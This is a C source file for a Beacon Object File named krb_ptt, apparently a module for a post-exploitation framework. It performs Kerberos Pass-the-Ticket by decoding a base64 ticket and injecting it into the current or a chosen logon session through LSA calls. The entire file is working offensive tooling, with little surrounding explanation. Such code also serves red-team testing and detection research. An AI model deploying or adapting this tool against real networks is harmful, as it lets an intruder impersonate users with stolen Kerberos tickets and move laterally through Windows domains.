/*
 * krb_ptt - Pass The Ticket - Submit a ticket to the current logon session
 *
 * Usage: krb_ptt /ticket:BASE64 [/luid:LOGONID]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#include <ntsecapi.h>

#define KerbSubmitTicketMessage 21

static int submit_ticket(const BYTE* ticket_data, size_t ticket_len, LUID* target_luid, formatp* output) {
    HANDLE hLsa = NULL;
    ULONG authPackage = 0;
    NTSTATUS status, subStatus;
    LSA_STRING kerbName;

    kerbName.Buffer = "Kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;

    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconFormatPrintf(output, "[-] LsaConnectUntrusted failed: 0x%08X\n", status);
        return 0;
    }

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
    if (status != 0) {
        BeaconFormatPrintf(output, "[-] LsaLookupAuthenticationPackage failed: 0x%08X\n", status);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return 0;
    }

    size_t request_size = sizeof(KERB_SUBMIT_TKT_REQUEST) + ticket_len;
    PKERB_SUBMIT_TKT_REQUEST request = (PKERB_SUBMIT_TKT_REQUEST)calloc(1, request_size);
    if (!request) {
        BeaconFormatPrintf(output, "[-] Memory allocation failed\n");
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return 0;
    }

    request->MessageType = KerbSubmitTicketMessage;
    if (target_luid) {
        request->LogonId = *target_luid;
    }
    request->Flags = 0;
    request->KerbCredSize = (ULONG)ticket_len;
    request->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);

    /* Copy ticket data after the request structure */
    memcpy((BYTE*)request + request->KerbCredOffset, ticket_data, ticket_len);

    PVOID response = NULL;
    ULONG responseLen = 0;

    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request,
                                                   (ULONG)request_size, &response, &responseLen, &subStatus);

    free(request);

    if (response) {
        SECUR32$LsaFreeReturnBuffer(response);
    }

    SECUR32$LsaDeregisterLogonProcess(hLsa);

    if (status != 0) {
        BeaconFormatPrintf(output, "[-] LsaCallAuthenticationPackage failed: 0x%08X\n", status);
        return 0;
    }

    if (subStatus != 0) {
        BeaconFormatPrintf(output, "[-] Ticket submission failed: 0x%08X\n", subStatus);
        return 0;
    }

    return 1;
}

void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 8 * 1024);
    arg_init(&parser, args, alen);

    char* ticket_b64 = arg_get(&parser, "ticket");
    char* luid_str = arg_get(&parser, "luid");

    if (!ticket_b64) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: krb_ptt /ticket:BASE64 [/luid:LOGONID]");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Action: Pass The Ticket (PTT)\n");

    LUID* target_luid = NULL;
    LUID luid_val;

    if (luid_str) {
        unsigned long long luid_int = 0;
        if (luid_str[0] == '0' && (luid_str[1] == 'x' || luid_str[1] == 'X')) {
            luid_int = strtol(luid_str + 2, NULL, 16);
        } else {
            luid_int = strtol(luid_str, NULL, 10);
        }
        luid_val.LowPart = (DWORD)luid_int;
        luid_val.HighPart = (LONG)(luid_int >> 32);
        target_luid = &luid_val;
        BeaconFormatPrintf(&output, "[*] Target LUID: 0x%08X:%08X\n", luid_val.HighPart, luid_val.LowPart);
    } else {
        BeaconFormatPrintf(&output, "[*] Submitting to current logon session\n");
    }

    size_t b64_len = strlen(ticket_b64);
    size_t max_decoded = (b64_len / 4) * 3 + 3;
    BYTE* ticket_data = (BYTE*)malloc(max_decoded);

    if (!ticket_data) {
        BeaconFormatPrintf(&output, "[-] Memory allocation failed\n");
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    size_t ticket_len = base64_decode(ticket_b64, b64_len, ticket_data);
    if (ticket_len == 0) {
        BeaconFormatPrintf(&output, "[-] Failed to decode base64 ticket\n");
        free(ticket_data);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Ticket size: %zu bytes\n", ticket_len);

    if (submit_ticket(ticket_data, ticket_len, target_luid, &output)) {
        BeaconFormatPrintf(&output, "[+] Ticket successfully submitted to logon session!\n");
        BeaconFormatPrintf(&output, "[*] Use 'krb_klist' to verify the ticket was imported\n");
    }

    free(ticket_data);
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (ticket_b64) free(ticket_b64);
    if (luid_str) free(luid_str);
}
